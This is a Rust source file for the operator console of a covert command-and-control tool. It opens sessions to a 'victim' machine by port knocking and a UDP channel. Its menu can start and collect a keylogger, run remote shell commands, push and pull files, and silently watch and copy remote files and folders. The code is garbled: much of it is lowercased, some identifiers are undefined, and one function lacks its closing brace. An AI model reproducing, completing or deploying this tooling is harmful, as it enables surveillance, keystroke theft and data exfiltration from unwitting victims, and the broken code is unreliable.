/// covert c2 commander server
use std::collections::hashmap;
use std::io::{self, write};
use std::net::{ipv4addr, ipaddr, socketaddr, udpsocket};
use std::sync::{arc, atomic::{atomicbool, ordering}};
use std::thread;
use std::time::{duration, instant, systemtime, unix_epoch};
use pnet::packet::ip::ipnextheaderprotocols;
use pnet::transport::{transport_channel, transportchanneltype::layer3};
use pnet_datalink as datalink;

mod port_knkr;
mod packet;

use port_knkr::{knocksession, port_knock};
use packet::{packetheader, header_size,
             packet_type_ack, packet_type_heartbeat,
             packet_type_cmd, packet_type_cmd_resp,
             packet_type_ctrl, packet_type_file, packet_type_keylog,
             packet_type_file_sync,
             file_sync_create, file_sync_update, file_sync_delete,
             flag_last_chunk, chunk_size,
             ctrl_start_keylogger, ctrl_stop_keylogger,
             ctrl_request_keylog, ctrl_uninstall};

const buffer_size: usize = 8192;
const max_retries: u32 = 3;

#[derive(clone, copy, partialeq)]
enum sessionstate {
    disconnected,
    connected,
}

pub struct commander {
    state: sessionstate,
    victim_ip: option<ipv4addr>,
    local_ip: option<ipv4addr>,
    tx_port: u16,
    rx_port: u16,
    knock_session: option<knocksession>,
    udp_socket: option<udpsocket>,
    running: arc<atomicbool>,
    pending_commands: hashmap<[u8; 16], instant>,
    keylog_buffer: hashmap<ipv4addr, vec<u8>>,
    file_watch_buffer: hashmap<ipv4addr, vec<u8>>,
    file_sync_reassembly: hashmap<[u8; 16], (string, vec<u8>)>,  // message_id -> (path, data)
    file_watch_active: bool,
    file_watch_path: option<string>,
    file_watch_local_path: option<string>,
}

impl commander {
    pub fn new() -> self {
        self {
            state: sessionstate::disconnected,
            victim_ip: none,
            local_ip: none,
            tx_port: 0,
            rx_port: 0,
            knock_session: none,
            udp_socket: none,
            running: arc::new(atomicbool::new(true)),
            pending_commands: hashmap::new(),
            keylog_buffer: hashmap::new(),
            file_watch_buffer: hashmap::new(),
            file_sync_reassembly: hashmap::new(),
            file_watch_active: false,
            file_watch_path: none,
            file_watch_local_path: none,
        }
    }

    pub fn run(&mut self) {
        println!("=== covert c2 commander ===");
        
        let shutdown = self.running.clone();
        let watch_active = arc::new(atomicbool::new(false));
        let watch_active_clone = watch_active.clone();
        
        ctrlc::set_handler(move || {
            println!("\nshutdown signal received");
            if watch_active_clone.load(ordering::seqcst) {
                println!("[*] stopping watch...");
                watch_active_clone.store(false, ordering::seqcst);
            } else {
                shutdown.store(false, ordering::seqcst);
            }
        }).expect("error setting ctrl-c handler");

        while self.running.load(ordering::seqcst) {
            match self.state {
                sessionstate::disconnected => self.disconnected_menu(),
                sessionstate::connected => self.connected_menu(&watch_active),
            }
            
            self.process_incoming();
            thread::sleep(duration::from_millis(50));
        }
        
        self.cleanup();
        println!("commander exiting");
    }

    fn disconnected_menu(&mut self) {
        println!("\n[disconnected]");
        println!("1) initiate session (port knock)");
        println!("0) exit");
        
        match prompt("selection > ").as_str() {
            "1" => self.initiate_connection(),
            "0" => {
                self.running.store(false, ordering::seqcst);
            },
            _ => println!("[!] invalid selection"),
        }
    }

    fn connected_menu(&mut self, watch_active: &arc<atomicbool>) {
        if let some(ip) = self.victim_ip {
            println!("\n[connected] -> {:?}", ip);
        }
        if self.file_watch_active {
            println!("[*] watch active: {}", self.file_watch_path.as_ref().map_or("unknown", |v| v));
        }
        println!("1) start keylogger");
        println!("2) stop keylogger");
        println!("3) request keylog file");
        println!("4) run shell command");
        println!("5) transfer file to victim");
        println!("6) transfer file from victim");
        println!("7) watch file/folder (unified)");
        if self.file_watch_active {
            println!("8) stop watch");
            println!("9) uninstall agent");
            println!("10) disconnect");
        } else {
            println!("8) uninstall agent");
            println!("9) disconnect");
        }
        println!("0) exit commander");
        
        let selection = prompt("selection > ");
        
        if !watch_active.load(ordering::seqcst) && self.file_watch_active {
            println!("[*] watch was stopped");
            self.file_watch_active = false;
            self.file_watch_path = none;
            self.file_watch_local_path = none;
        }
        
        match selection.as_str() {
            "1" => self.start_keylogger(),
            "2" => self.stop_keylogger(),
            "3" => self.request_keylog_file(),
            "4" => self.run_program(),
            "5" => self.upload_file(),
            "6" => self.download_file(),
            "7" => self.unified_watch(&watch_active),
            "8" => {
                if self.file_watch_active {
                    self.stop_watch();
                } else {
                    self.uninstall();
                }
            }
            "9" => {
                if self.file_watch_active {
                    self.stop_watch();
                } else {
                    self.disconnect();
                }
            }
            "10" => {
                if self.file_watch_active {
                    self.stop_watch();
                }
            }
            "0" => {
                self.running.store(false, ordering::seqcst);
            },
            _ => println!("[!] invalid selection"),
        }
    }

    fn initiate_connection(&mut self) {
        let target_ip_str = prompt("target ip [127.0.0.1]: ");
        let ip = target_ip_str.parse::<ipv4addr>()
            .unwrap_or_else(|_| ipv4addr::new(127, 0, 0, 1));

        println!("sending knock sequence to {}...", ip);
        
        match port_knock(ip) {
            ok(session) => {
                let tx_port = session.tx_port;
                let rx_port = session.rx_port;
                
                self.victim_ip = some(ip);
                self.tx_port = tx_port;
                self.rx_port = rx_port;
                self.knock_session = some(session);
                 
                self.local_ip = self::find_interface_for_target(ip)
                    .map(|(_, local)| local)
                    .or(some(ipv4addr::new(127, 0, 0, 1)));

                match udpsocket::bind(format!("0.0.0.0:{}", self.rx_port)) {
                    ok(socket) => {
                        socket.set_read_timeout(some(duration::from_millis(100))).ok();
                        self.udp_socket = some(socket);
                        println!("[+] covert channel: send->{} recv<-{}", 
                                self.tx_port, self.rx_port);
                        
                        self.state = sessionstate::connected;
                        self.send_heartbeat();
                    }
                    err(e) => {
                        eprintln!("[!] udp bind failed: {}", e);
                        if let some(ref sess) = self.knock_session {
                            sess.stop();
                        }
                    }
                }
            }
            err(e) => println!("[!] knock failed: {}", e),
        }
    }

    fn find_interface_for_target(target: ipv4addr) -> option<(string, ipv4addr)> {
        let interfaces = datalink::interfaces();
        for iface in &interfaces {
            for ip_net in &iface.ips {
                if let ipaddr::v4(local) = ip_net.ip() {
                    if ip_net.contains(ipaddr::v4(target)) || local.is_loopback() {
                        return some((iface.name.clone(), local));
                    }
                }
            }
        }
        none
    }

    fn send_command(&mut self, ptype: u8, subtype: u8, content: &str) -> option<[u8; 16]> {
        if let (some(udp), some(victim)) = (&self.udp_socket, self.victim_ip) {
            let header = packetheader::new(ptype, subtype, content);
            let msg_id = header.message_id;
            
            let mut packet = vec::with_capacity(header_size + content.len());
            packet.extend_from_slice(&header.to_bytes());
            packet.extend_from_slice(content.as_bytes());
            
            let server_addr = socketaddr::new(victim.into(), self.tx_port);
            
            for retry in 0..max_retries {
                if udp.send_to(&packet, server_addr).is_ok() {
                    self.pending_commands.insert(msg_id, instant::now());
                    return some(msg_id);
                }
                thread::sleep(duration::from_millis(100 * (retry as u64 + 1)));
            }
        }
        none
    }

    fn send_packet(&self, ptype: u8, subtype: u8, content: &[u8]) -> result<(), string> {
        if let (some(udp), some(victim)) = (&self.udp_socket, self.victim_ip) {
            let content_str = string::from_utf8_lossy(content);
            let header = packetheader::new(ptype, subtype, &content_str);
            
            let mut packet = vec::with_capacity(header_size + content.len());
            packet.extend_from_slice(&header.to_bytes());
            packet.extend_from_slice(content);
            
            let server_addr = socketaddr::new(victim.into(), self.tx_port);
            
            for retry in 0..max_retries {
                if udp.send_to(&packet, server_addr).is_ok() {
                    return ok(());
                }
                thread::sleep(duration::from_millis(100 * (retry as u64 + 1)));
            }
            err("failed to send packet after retries".to_string())
        } else {
            err("no udp socket or victim ip".to_string())
        }
    }

    fn send_control(&self, subtype: u8) {
        let header = packetheader::new_ctrl(subtype);
        let mut packet = [0u8; header_size];
        packet.copy_from_slice(&header.to_bytes());
        
        if let (some(udp), some(victim)) = (&self.udp_socket, self.victim_ip) {
            let addr = socketaddr::new(victim.into(), self.tx_port);
            let _ = udp.send_to(&packet, addr);
        }
    }

    fn send_heartbeat(&self) {
        if let (some(udp), some(victim)) = (&self.udp_socket, self.victim_ip) {
            let hb = packetheader::new_heartbeat();
            let mut buf = [0u8; header_size];
            buf.copy_from_slice(&hb.to_bytes());
            let addr = socketaddr::new(victim.into(), self.tx_port);
            let _ = udp.send_to(&buf, addr);
        }
    }

    fn process_incoming(&mut self) {
        if let Some(ref udp) = self.udp_socket {
            let mut buffer = [0u8; BUFFER_SIZE];

            udp.set_read_timeout(Some(Duration::from_millis(1))).ok();

            while let Ok((size, addr)) = udp.recv_from(&mut buffer) {
                if size < HEADER_SIZE {
                    continue;
                }

                if let Some(header) = PacketHeader::from_bytes(&buffer[..HEADER_SIZE]) {
                    let payload = &buffer[HEADER_SIZE..size];

                    match header.packet_type {
                        PACKET_TYPE_ACK => {
                            self.pending_commands.remove(&header.message_id);
                        }
                        PACKET_TYPE_CMD_RESP => {
                            if let Ok(resp) = String::from_utf8(payload.to_vec()) {
                                println!("\n{}", resp);
                            }
                        }
                        PACKET_TYPE_KEYLOG | PACKET_TYPE_FILE => {
                            if let Some(ip) = self.victim_ip {
                                self.keylog_buffer.entry(ip)
                                    .or_insert_with(Vec::new)
                                    .extend_from_slice(payload);
                            }
                        }
                        // Handle FILE_WATCH packets (single file)
                        PACKET_TYPE_FILE_WATCH => {
                            if let Some(ip) = self.victim_ip {
                                match header.subtype {
                                    FILE_WATCH_UPDATE => {
                                        if payload.len() > 0 {
                                            self.file_watch_buffer.entry(ip)
                                                .or_insert_with(Vec::new)
                                                .extend_from_slice(payload);
                                        } else {
                                            // Empty packet = end of update
                                            if let Some(local_path) = &self.file_watch_local_path {
                                                if let Some(data) = self.file_watch_buffer.get(&ip) {
                                                    let _ = std::fs::write(local_path, data);
                                                    println!("[*] File updated ({} bytes)", data.len());
                                                }
                                            }
                                            self.file_watch_buffer.remove(&ip);
                                        }
                                    }
                                    FILE_WATCH_DELETE => {
                                        println!("[!] File deleted remotely");
                                        if let Some(local_path) = &self.file_watch_local_path {
                                            if std::path::Path::new(local_path).exists() {
                                                let timestamp = SystemTime::now()
                                                    .duration_since(UNIX_EPOCH)
                                                    .unwrap()
                                                    .as_secs();
                                                if let Some(filename) = std::path::Path::new(local_path).file_name() {
                                                    let deleted_path = format!(
                                                        "watched/deleted/{}_{}",
                                                        filename.to_string_lossy(),
                                                        timestamp
                                                    );
                                                    let _ = std::fs::rename(local_path, deleted_path);
                                                }
                                            }
                                        }
                                        self.file_watch_active = false;
                                    }
                                    _ => {}
                                }
                            }
                        }
                        // Handle FOLDER_WATCH packets (folder with multiple files)
                        PACKET_TYPE_FOLDER_WATCH => {
                            if let Some(ip) = self.victim_ip {
                                match header.subtype {
                                    FOLDER_WATCH_FILE_CREATE | FOLDER_WATCH_FILE_UPDATE => {
                                        if payload.len() > 0 {
                                            let path_len = payload[0] as usize;
                                            if payload.len() > 1 + path_len {
                                                let file_path = String::from_utf8_lossy(&payload[1..1+path_len]).to_string();
                                                let file_data = &payload[1+path_len..];
                                                
                                                if let Some(local_folder) = &self.folder_watch_local_path {
                                                    let local_file_path = format!("{}/{}", local_folder, file_path);
                                                    
                                                    // Create parent directories
                                                    if let Some(parent) = std::path::Path::new(&local_file_path).parent() {
                                                        let _ = std::fs::create_dir_all(parent);
                                                    }
                                                    
                                                    // Write file
                                                    if let Ok(mut file) = std::fs::OpenOptions::new()
                                                        .create(true)
                                                        .write(true)
                                                        .truncate(true)
                                                        .open(&local_file_path) {
                                                        let _ = file.write_all(file_data);
                                                        println!("[*] Folder file {}: {}", 
                                                            if header.subtype == FOLDER_WATCH_FILE_CREATE { "created" } else { "updated" },
                                                            file_path);
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    FOLDER_WATCH_FILE_DELETE => {
                                        if payload.len() > 0 {
                                            let path_len = payload[0] as usize;
                                            if payload.len() > 1 + path_len {
                                                let file_path = String::from_utf8_lossy(&payload[1..1+path_len]).to_string();
                                                
                                                if let Some(local_folder) = &self.folder_watch_local_path {
                                                    let local_file_path = format!("{}/{}", local_folder, file_path);
                                                    if std::path::Path::new(&local_file_path).exists() {
                                                        let _ = std::fs::remove_file(&local_file_path);
                                                        println!("[!] Folder file deleted: {}", file_path);
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    _ => {}
                                }
                            }
                        }
                        PACKET_TYPE_HEARTBEAT => {
                            let ack = PacketHeader::new_ack(header.message_id);
                            let mut ack_buf = [0u8; HEADER_SIZE];
                            ack_buf.copy_from_slice(&ack.to_bytes());
                            let _ = udp.send_to(&ack_buf, addr);
                        }
                        _ => {}
                    }
                }
            }
        }

        let now = Instant::now();
        self.pending_commands
            .retain(|_, sent| now.duration_since(*sent) < Duration::from_secs(10));
    }

    // add this - handle file_sync chunk
    fn handle_file_sync_chunk(&mut self, header: packetheader, payload: &[u8]) {
        if payload.is_empty() { return; }
        
        let path_len = payload[0] as usize;
        if payload.len() < 1 + path_len { return; }
        
        let path = string::from_utf8_lossy(&payload[1..1+path_len]).to_string();
        let file_data = &payload[1+path_len..];
        
        // create local path in watched/ directory
        let local_path = format!("watched/{}", path.replace('/', "_").replace('\\', "_"));
        
        // ensure watched directory exists
        let _ = std::fs::create_dir_all("watched");
        
        // get or create entry in reassembly buffer
        let entry = self.file_sync_reassembly
            .entry(header.message_id)
            .or_insert_with(|| (path.clone(), vec::new()));
        
        // append chunk data
        entry.1.extend_from_slice(file_data);
        
        // check if last chunk
        if header.flags & flag_last_chunk != 0 {
            if let some((full_path, full_data)) = self.file_sync_reassembly.remove(&header.message_id) {
                let _ = std::fs::write(&local_path, &full_data);
                println!("[+] file synced: {} -> {} ({} bytes)", full_path, local_path, full_data.len());
            }
        }
    }

    // add this - handle file_sync delete
    fn handle_file_sync_delete(&mut self, payload: &[u8]) {
        if payload.is_empty() { return; }
        
        let path_len = payload[0] as usize;
        if payload.len() < 1 + path_len { return; }
        
        let path = string::from_utf8_lossy(&payload[1..1+path_len]).to_string();
        let local_path = format!("watched/{}", path.replace('/', "_").replace('\\', "_"));
        
        let _ = std::fs::remove_file(&local_path);
        println!("[!] file deleted: {}", local_path);
    }

    fn start_keylogger(&mut self) {
        println!("[*] starting keylogger on victim...");
        self.send_control(ctrl_start_keylogger);
        println!("[+] keylogger start command sent");
    }

    fn stop_keylogger(&mut self) {
        println!("[*] stopping keylogger on victim...");
        self.send_control(ctrl_stop_keylogger);
        println!("[+] keylogger stop command sent");
    }

    fn request_keylog_file(&mut self) {
        println!("[*] requesting keylog file from victim...");
        self.send_control(ctrl_request_keylog);
        
        println!("[*] waiting for keylog data (ctrl+c to cancel)...");
        let start = instant::now();
        while start.elapsed() < duration::from_secs(30) && self.running.load(ordering::seqcst) {
            self.process_incoming();
            if let some(ip) = self.victim_ip {
                if let some(data) = self.keylog_buffer.get(&ip) {
                    if !data.is_empty() {
                        println!("\n[+] received {} bytes of keylog data", data.len());
                        if let ok(mut f) = std::fs::file::create("keylog.txt") {
                            let _ = f.write_all(data);
                            println!("[+] saved to keylog.txt");
                        }
                        self.keylog_buffer.remove(&ip);
                        return;
                    }
                }
            }
            thread::sleep(duration::from_millis(200));
        }
        println!("[!] timeout waiting for keylog data");
    }

    fn run_program(&mut self) {
        println!("[*] interactive shell (type 'exit' to return to menu)");
        
        loop {
            let cmd = prompt("shell > ");
            
            if cmd.trim().to_lowercase() == "exit" {
                println!("[+] returning to menu...");
                break;
            }
            
            if cmd.is_empty() {
                continue;
            }
            
            if self.send_command(packet_type_cmd, 0, &cmd).is_some() {
                let start = instant::now();
                while start.elapsed() < duration::from_secs(10) && self.running.load(ordering::seqcst) {
                    self.process_incoming();
                    if self.pending_commands.is_empty() {
                        break;
                    }
                    thread::sleep(duration::from_millis(100));
                }
            }
        }
    }

    fn upload_file(&mut self) {
        let local_path = prompt("local file path: ");
        let remote_path = prompt("remote file path: ");
        
        if local_path.is_empty() || remote_path.is_empty() {
            println!("[!] invalid paths");
            return;
        }

        println!("[*] uploading {} -> {}...", local_path, remote_path);
        
        let file_data = match std::fs::read(&local_path) {
            ok(data) => data,
            err(e) => {
                println!("[!] failed to read file: {}", e);
                return;
            }
        };

        let mut metadata = vec::new();
        metadata.push(remote_path.as_bytes().len() as u8);
        metadata.extend_from_slice(remote_path.as_bytes());
        metadata.extend_from_slice(&(file_data.len() as u32).to_le_bytes());
        
        if self.send_packet(packet_type_file, 0, &metadata).is_err() {
            println!("[!] failed to send metadata");
            return;
        }
        println!("[+] metadata sent");

        let total_chunks = (file_data.len() + chunk_size - 1) / chunk_size;
        for (i, chunk) in file_data.chunks(chunk_size).enumerate() {
            print!("\r[*] uploading chunk {}/{}...", i + 1, total_chunks);
            io::stdout().flush().unwrap();
            
            if self.send_packet(packet_type_file, 0, chunk).is_err() {
                println!("\n[!] failed to send chunk {}", i + 1);
                return;
            }
            thread::sleep(duration::from_millis(50));
        }

        self.send_packet(packet_type_file, 0, &[0xff]).ok();
        println!("\n[+] file upload complete!");
    }

    fn download_file(&mut self) {
        let remote_path = prompt("remote file path: ");
        let local_path = prompt("local save path: ");
        
        if remote_path.is_empty() || local_path.is_empty() {
            println!("[!] invalid paths");
            return;
        }

        println!("[*] downloading {} -> {}...", remote_path, local_path);
        
        let mut request = vec::new();
        request.push(0x70);
        request.push(remote_path.as_bytes().len() as u8);
        request.extend_from_slice(remote_path.as_bytes());
        
        if self.send_packet(packet_type_cmd, 0, &request).is_err() {
            println!("[!] failed to send download request");
            return;
        }
        println!("[+] download request sent");

        let mut file_data = vec::new();
        let start = instant::now();
        let mut chunk_count = 0;

        println!("[*] receiving file data...");
        
        while start.elapsed() < duration::from_secs(60) && self.running.load(ordering::seqcst) {
            self.process_incoming();
            
            if let some(ip) = self.victim_ip {
                if let some(data) = self.keylog_buffer.get(&ip) {
                    if data.len() == 1 && data[0] == 0xff {
                        break;
                    }
                    file_data.extend_from_slice(data);
                    chunk_count += 1;
                    print!("\r[*] received {} chunks...", chunk_count);
                    io::stdout().flush().unwrap();
                    self.keylog_buffer.remove(&ip);
                }
            }
            thread::sleep(duration::from_millis(100));
        }

        if !file_data.is_empty() {
            match std::fs::write(&local_path, &file_data) {
                ok(_) => println!("\n[+] download complete! saved to {}", local_path),
                err(e) => println!("\n[!] failed to write file: {}", e),
            }
        } else {
            println!("\n[!] no data received");
        }
    }

    fn unified_watch(&mut self, watch_active: &Arc<AtomicBool>) {
        let remote_path = prompt("Remote path to watch (file or folder): ");

        if remote_path.is_empty() {
            println!("[!] Invalid path");
            return;
        }

        std::fs::create_dir_all("watched").ok();
        std::fs::create_dir_all("watched/deleted").ok();

        // Create local path based on remote path
        let local_name = remote_path.split('/').last().unwrap_or("watched_item");
        let local_path = format!("watched/{}", local_name);

        println!("[*] Watching {} (dynamically detects file/folder)", remote_path);
        println!("[*] Local save location: {}", local_path);

        // Send unified watch command (0x77)
        let mut request = Vec::new();
        request.push(0x77);
        request.push(remote_path.as_bytes().len() as u8);
        request.extend_from_slice(remote_path.as_bytes());

        if self.send_packet(PACKET_TYPE_CMD, 0, &request).is_err() {
            println!("[!] Failed to send watch request");
            return;
        }

        println!("[+] Watch request sent. Receiving initial content (if file)...");
        
        // Receive initial file content if it's a file
        let mut file_data = Vec::new();
        let start = Instant::now();
        
        while start.elapsed() < Duration::from_secs(30) && self.running.load(Ordering::SeqCst) {
            self.process_incoming();
            
            if let Some(ip) = self.victim_ip {
                if let Some(data) = self.keylog_buffer.get(&ip) {
                    if data.len() == 1 && data[0] == 0xFF {
                        break;
                    }
                    file_data.extend_from_slice(data);
                    self.keylog_buffer.remove(&ip);
                }
            }
            thread::sleep(Duration::from_millis(100));
        }
        
        if !file_data.is_empty() {
            let _ = std::fs::write(&local_path, &file_data);
            println!("[+] Initial file saved ({} bytes)", file_data.len());
        }

        self.file_watch_active = true;
        self.file_watch_path = Some(remote_path.clone());
        self.file_watch_local_path = Some(local_path.clone());
        self.folder_watch_local_path = Some(local_path.clone());
        watch_active.store(true, Ordering::SeqCst);

        println!("[*] Monitoring for changes (Ctrl+C to stop)...");

        while self.running.load(Ordering::SeqCst)
            && watch_active.load(Ordering::SeqCst)
        {
            self.process_incoming();
            thread::sleep(Duration::from_millis(200));
        }

        self.file_watch_active = false;
        self.file_watch_path = None;
        self.file_watch_local_path = None;
        self.folder_watch_local_path = None;
        watch_active.store(false, Ordering::SeqCst);

        println!("[*] Watch stopped");
    }

    fn stop_watch(&mut self) {

        println!("[*] stopping watch");

        if let Some(ref remote_path) = self.file_watch_path {

            let mut stop_request = Vec::new();

            stop_request.push(0x78);
            stop_request.push(remote_path.as_bytes().len() as u8);
            stop_request.extend_from_slice(remote_path.as_bytes());

            let _ = self.send_packet(PACKET_TYPE_CMD, 0, &stop_request);
        }

        self.file_watch_active = false;
        self.file_watch_path = None;

        self.file_sync_reassembly.clear();

        println!("[+] watch stopped");

    fn uninstall(&mut self) {
        println!("uninstalling agent from victim...");
        if prompt("confirm uninstall? (yes/no) > ").to_lowercase() == "yes" {
            self.send_control(ctrl_uninstall);
            println!("uninstall signal sent");
            thread::sleep(duration::from_secs(2));
            self.disconnect();
        } else {
            println!("uninstall cancelled");
        }
    }

    fn disconnect(&mut self) {
        println!("disconnecting from victim...");
        
        if self.file_watch_active {
            self.stop_watch();
        }
        
        if let some(ref session) = self.knock_session {
            session.stop();
        }
        
        self.state = sessionstate::disconnected;
        self.victim_ip = none;
        self.udp_socket = none;
        self.knock_session = none;
        self.pending_commands.clear();
        self.keylog_buffer.clear();
        self.file_sync_reassembly.clear();
        
        println!("[+] disconnected");
    }

    fn cleanup(&mut self) {
        self.disconnect();
        self.running.store(false, ordering::seqcst);
    }
}

fn prompt(text: &str) -> string {
    print!("{}", text);
    let _ = io::stdout().flush();
    let mut input = string::new();
    let _ = io::stdin().read_line(&mut input);
    input.trim().to_string()
}

fn main() -> std::io::result<()> {
    match transport_channel(4096, layer3(ipnextheaderprotocols::tcp)) {
        ok(_) => {},
        err(e) => {
            eprintln!("[!] warning: raw socket failed: {}", e);
            eprintln!("    run with: doas ./commander  or  set cap_net_raw capability");
            eprintln!("    continuing with menu anyway...\n");
        }
    }
    
    let mut commander = commander::new();
    commander.run();
    ok(())
}
